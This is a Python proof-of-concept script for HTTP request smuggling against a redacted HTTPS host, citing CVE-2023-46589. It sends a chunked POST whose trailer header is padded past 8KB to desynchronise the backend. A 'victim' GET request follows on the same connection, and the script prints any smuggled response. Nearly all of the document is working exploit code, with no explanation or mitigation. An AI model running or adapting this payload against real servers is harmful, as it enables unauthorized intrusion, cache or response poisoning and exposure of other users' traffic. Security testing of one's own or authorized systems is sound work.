import socket
import ssl

host = "REDACTED"
port = 443

context = ssl.create_default_context()
sock = socket.create_connection((host, port))
ssock = context.wrap_socket(sock, server_hostname=host)

# --- SET A SHORT TIMEOUT (e.g., 5 seconds) ---
ssock.settimeout(5)  # Don't wait forever

try:
    # --- Step 1: Send the crashing payload ---
    crash_payload = (
        "POST REDACTED?exploit=trailer HTTP/1.1\r\n"
        "Host: REDACTED\r\n"
        "Connection: keep-alive\r\n"
        "Content-Type: application/json\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Trailer: " + "X-Oversized-Header-" + "0" * 9000 + "\r\n"  # >8KB to trigger CVE-2023-46589
        "\r\n"
        "5\r\n"
        '{"a":"b"}\r\n'
        "0\r\n"
        "\r\n"
    )

    ssock.send(crash_payload.encode())

    # --- Step 2: IMMEDIATELY send a "victim" request ---
    victim_request = (
        "GET /REDACTED?smuggled=yes HTTP/1.1\r\n"
        "Host: REDACTED\r\n"
        "Connection: close\r\n"  # Important: Close after this to force response
        "Origin: https://www.REDACTED\r\n"
        "Referer: https://www.REDACTED/\r\n"
        "\r\n"
    )

    ssock.send(victim_request.encode())

    # --- Step 3: Try to read the response (with timeout) ---
    try:
        response = ssock.recv(8192)
        print("=== SMUGGLED REQUEST RESPONSE ===")
        print(response.decode(errors='ignore'))
    except socket.timeout:
        print("[!] Socket timed out — this is expected. Backend may be desynced.")
    except Exception as e:
        print(f"[!] Error receiving response: {e}")

except Exception as e:
    print(f"[!] Connection error: {e}")

finally:
    ssock.close()
    print("[*] Connection closed.")
